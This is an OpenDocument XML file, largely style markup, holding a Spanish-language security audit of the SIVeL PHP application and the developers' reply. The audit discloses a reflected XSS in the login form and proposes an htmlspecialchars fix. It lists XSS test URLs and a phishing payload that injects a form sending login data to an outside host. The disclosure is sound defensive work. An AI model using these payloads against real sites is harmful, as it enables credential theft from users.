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Arial" svg:font-family="Arial, sans-serif"/>
    <style:font-face style:name="Courier New1" svg:font-family="'Courier New'"/>
    <style:font-face style:name="StarSymbol" svg:font-family="StarSymbol"/>
    <style:font-face style:name="Times New Roman1" svg:font-family="'Times New Roma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3" svg:font-family="Arial" style:font-family-generic="system" style:font-pitch="variable"/>
  </office:font-face-decls>
  <office:automatic-styles>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Arial" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="center" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Arial1"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Arial1" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in"/>
      <style:text-properties fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Arial1"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0in" fo:margin-right="0in" fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body" style:master-page-name="HTML">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" fo:text-align="center" style:justify-single-word="false" style:page-number="auto"/>
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" fo:font-weight="bold"/>
    </style:style>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text-properties fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Arial2" fo:font-size="10pt" style:font-name-complex="Arial2"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false" fo:break-before="page"/>
      <style:text-properties style:font-name="Arial2" fo:font-weight="bold" style:font-weight-asian="bold" style:font-name-complex="Arial2" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties style:font-name="Arial1"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:font-name="Arial1" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" fo:font-size="8.64999961853027pt" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" style:font-name="Arial1" fo:font-size="8.64999961853027pt" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties style:font-name="Courier New1"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties style:font-name="Courier New1" fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:font-name="Courier New1" fo:font-size="10pt"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-size="12pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Arial2" fo:font-size="24pt" style:font-size-asian="24pt" style:font-weight-asian="bold" style:font-name-complex="Arial2" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Arial2" fo:font-size="10pt" style:font-name-complex="Arial2"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Arial2" style:font-name-complex="Arial2"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Arial2" fo:font-size="8pt" style:font-size-asian="8pt" style:font-name-complex="Arial2" style:font-size-complex="8pt"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Arial2" fo:font-size="6pt" style:font-size-asian="6pt" style:font-name-complex="Arial2" style:font-size-complex="6pt"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-name-complex="Arial2"/>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2">AUDITORIA pre1.0-2 Y RESPUESTA</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">I. AUDITORIA DE SEGURIDAD A LAS FUENTES DE SIVeL DISPONIBLES EN EL CVS EN ENERO DE 2007</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">Fernando Muñoz Sánchez &lt;fmunozs@unal.edu.co - munozferna@gmail.com&gt;</text:span> </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">Dominio público</text:span> </text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7"><text:span text:style-name="T3">Debido al llamado realizado por los desarrolladores de SIVel con fin de ubicar fallas de seguridad en el codigo fuente, he realizado una busqueda de errores sobre el uso inapropiado de ciertas directivas de PHP. Se encontro una falla la cual es reportada y descrita en el documento a continuación.</text:span> </text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">PROCEDIMIENTOS PARA ENCONTRAR LAS FALLAS</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">La auditoria se baso en el uso incorrecto de la variable PHP $_SERVER['PHP_SELF'], mediante una simple prueba con el navegador en los arcihvos de la pagina, realizando peticiones como:</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">http://sitio.com/archivo.php/"&gt;&lt;h4&gt;XSS</text:span> </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">http://sitio.com/archivo.php/'&gt;&lt;h4&gt;XSS</text:span> </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">http://sitio.com/archivo.php/' onmouseover='alert(1)</text:span> </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">http://sitio.com/archivo.php/" onmouseover="alert(1)</text:span> </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">http://sitio.com/archivo.php/" onerror="alert(1)</text:span> </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">FALLAS ENCONTRADAS Y SOLUCIONES PROPUESTAS</text:span> </text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T5"><text:line-break/>El formulario de autenticacion utiliza la variable PHP_SELF en el action del form, sin realizar una validacion previa del contenido de esta, el tipo de vulnerabilidad es Cross Site Scripting, tambien conocido como </text:span><text:bookmark text:name="vdw."/><text:a xlink:type="simple" xlink:href="http://en.wikipedia.org/wiki/Cross-site_scripting"><text:span text:style-name="T5">XSS</text:span></text:a><text:span text:style-name="T5">, si un usuario no autenticado ingresa a un enlace como el siguiente:</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P12"><text:span text:style-name="T6">https://sivel099.pasosdejesus.org/index.php/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13"><text:span text:style-name="T7">El codigo javascript sera ejecutado en el navegador del usuario. Esta falla se encuentra en la funcion</text:span> <text:span text:style-name="T4">loginFunction</text:span><text:span text:style-name="T7">() la cual es la encargada de mostrar el formulario de inicio de sesion, en el archivo /sivel/aut/aut.php.</text:span></text:p>
      <text:p text:style-name="P11"><text:s text:c="3"/><text:span text:style-name="T9">22 </text:span><text:span text:style-name="T11"><text:s text:c="4"/></text:span><text:span text:style-name="T9">echo</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T9">"&lt;form method=\"post\"</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T9">action=\""</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T9">. $_SERVER['PHP_SELF']</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T9">. "\"&gt;";</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">Solución:</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P1">Reemplazar la linea 22 por:</text:p>
      <text:p text:style-name="P11"><text:s/><text:span text:style-name="T8">echo "&lt;form method=\"post\" action=\"" . htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES) . "\"&gt;";</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">htmlspecialchars() codificará los caracteres especiales a su entidad HTML lo cual evita que se inyecte codigo HTML en la pagina y evita los XSS. Esto se debe realizar siempre que se utilize la variable $_SERVER['PHP_SELF'], o tambien se podria realizar este filtro por unica vez en un archivo que sea incluido en todos los formularios, como puede er el de configuracion, escribir algo como:<text:line-break/><text:line-break/></text:span><text:span text:style-name="T10">$_SERVER['PHP_SELF'] = htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES)</text:span><text:span text:style-name="T8">;</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T8"/></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T8"/></text:p>
      <text:p text:style-name="P7"><text:soft-page-break/><text:span text:style-name="T3">Esta falla podria ser abusada por atacantes que deseen obtener las credenciales de inicio de sesion, es decir ataques de Phishing contra los usuarios del sistema SIVeL:</text:span> </text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8">https://sivel099.pasosdejesus.org/index.php/%22%3E%3C/form%3E%3Cform%20action=%22http://beford.org/formulariofalso%22%20method=%22get</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P8">En este ejemplo, los datos que sean ingresados al formulario son enviados hacia una pagina tercera, la cual bien podria almacenar todos los datos, y luego redireccionar nuevamente al sitio original, con el fin de evitar que el usuario lo note. Ademas de esto, cualquier otro sistema que corra en el mismo dominio pasosdejesus, como es el caso de Foros, Chats, seria vulnerable a ataques XSS, robo de Cookies, etc.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">AUDITOR</text:span> </text:p>
      <text:p text:style-name="P4"/>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P15"><text:span text:style-name="T1">Estudiante de Segundo Semestre de Ingenieria de Sistemas en la Universidad Nacional de Colombia Sede Bogota.</text:span> </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15"><text:span text:style-name="T1">Security Researcher autor del blog </text:span><text:bookmark text:name="vb4o"/><text:a xlink:type="simple" xlink:href="http://beford.org/"><text:span text:style-name="T1">http://beford.org/</text:span></text:a><text:span text:style-name="T1"> </text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P19"><text:bookmark text:name="pet5"/><text:a xlink:type="simple" xlink:href="http://www.microsoft.com/technet/security/acknowledge/archive.mspx#EDG"><text:span text:style-name="T1">http://www.microsoft.com/technet/security/acknowledge/archive.mspx#EDG</text:span></text:a></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P22">II. RESPUESTA DEL EQUIPO DE DESARROLLO DE SIVEL</text:p>
      <text:p text:style-name="P20">Vladimir Támara Patiño. <text:s text:c="3"/><text:a xlink:type="simple" xlink:href="mailto:vtamara@pasosdeJesus.orgD">vtamara@pasosdeJesus.org</text:a> <text:s text:c="3"/>Dominio público</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P21"><text:span text:style-name="T13">Agradecemos a Fernando el interés, el tiempo y esfuerzo que dedico para encontrar la falla descrita, la cual se corrigió según su sugerencia, y la sugerencia se aplicó a otras partes de SIVeL donde se usaba </text:span><text:span text:style-name="T18">$SERVER['PHP_SELF']</text:span><text:span text:style-name="T13">.</text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T13"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T13">Como referencia para la falla Fernando envió posteriormente: http://blog.phpdoc.info/archives/13-XSS-Woes.html</text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T13"/></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T13">Además de esta falla Fernando encontró un error (que no es de seguridad) en las fuentes de SIVeL y reportó un error en la función </text:span><text:span text:style-name="T17">escapeshellarg</text:span> de PHP <text:span text:style-name="T13">en su implementación para Windows (por no escapar o eliminar el caracter comillas “):</text:span></text:p>
      <text:p text:style-name="P21"><text:a xlink:type="simple" xlink:href="https://sourceforge.net/mailarchive/forum.php?thread_name=211a5aa60801211322i2a64b1e4h7f634437ce9b19a2%40mail.gmail.com&amp;forum_name=sivel-soporte"><text:span text:style-name="T16">https://sourceforge.net/mailarchive/forum.php?thread_name=211a5aa60801211322i2a64b1e4h7f634437ce9b19a2%40mail.gmail.com&amp;forum_name=sivel-soporte</text:span></text:a></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T13"/></text:p>
      <text:p text:style-name="P21"><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Arial" svg:font-family="Arial, sans-serif"/>
    <style:font-face style:name="Courier New1" svg:font-family="'Courier New'"/>
    <style:font-face style:name="StarSymbol" svg:font-family="StarSymbol"/>
    <style:font-face style:name="Times New Roman1" svg:font-family="'Times New Roma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3"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3" style:font-size-asian="12pt" style:language-asian="zxx" style:country-asian="none" style:font-name-complex="Arial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text-indent="0in" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Times New Roman1" fo:font-size="12pt" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-name-complex="Times New Roman1" style:font-size-complex="12pt"/>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class="text" style:default-outline-level="6">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" style:font-size-asian="10pt" style:font-weight-asian="bold"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fo:padding="0.1in" fo:border="0.0008in solid #ddddd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Unix OpenOffice.org_project/680m9$Build-9238</meta:generator>
    <meta:creation-date>2008-01-19T11:09:34</meta:creation-date>
    <dc:creator>Vladimir Tamara Patino</dc:creator>
    <dc:date>2008-02-07T07:14:18</dc:date>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:editing-duration>PT1H6M52S</meta:editing-duration>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="34" meta:word-count="613" meta:character-count="4074"/>
  </office:meta>
</office:document-meta>
</file>